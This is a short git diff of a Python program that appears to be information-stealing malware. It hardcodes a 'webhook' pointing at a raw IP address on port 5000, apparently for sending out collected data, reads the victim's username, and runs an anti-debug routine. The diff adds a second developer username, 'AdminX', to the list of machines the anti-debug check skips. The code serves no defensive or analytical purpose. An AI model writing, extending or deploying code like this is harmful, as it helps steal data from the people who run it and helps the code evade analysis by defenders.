@@ -14,7 +14,7 @@ import subprocess
 from src import *
 
 # creds to vast :skull:
-# im too lazy to make this ongong
+# im too lazy to make this even tho this shit ongong
 
 webhook = "http://91.200.101.4:5000"
 username = getpass.getuser()
@@ -188,6 +188,8 @@ class AntiDebug(Thread):
 def run_anti_debug():
     pc_username = getpass.getuser()
     if pc_username == "DEXV":
+        pass
+    elif pc_username == "AdminX":
         pass
     else:
         self = AntiDebug()
